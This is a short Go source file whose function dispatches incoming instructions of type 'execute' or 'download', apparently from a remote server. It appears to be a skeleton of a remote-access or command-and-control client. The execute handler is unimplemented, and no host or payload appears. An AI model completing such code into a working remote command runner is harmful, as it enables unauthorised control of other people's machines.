package utils

import (
	"log"
)

func HandleCommand(result map[string]interface{}) {
	cmd_type, ok := result["type"].(string)
	if !ok {
		log.Fatal("Correct but no cmd")
	}

	if cmd_type == "execute" {

		cmd, ok := result["command"].(string)
		if !ok {
			log.Fatal("Can't read execute cmd")
		}

		handleExecute(cmd)

	} else if cmd_type == "download" {
		url, ok := result["url"].(string)
		if !ok {
			log.Fatal("Can't read download url")
		}

		handleDownload(url)
	}

}

func handleDownload(url string) {
	DownloadFrom(url)
}

func handleExecute(cmd string) {
	panic("unimplemented")
}
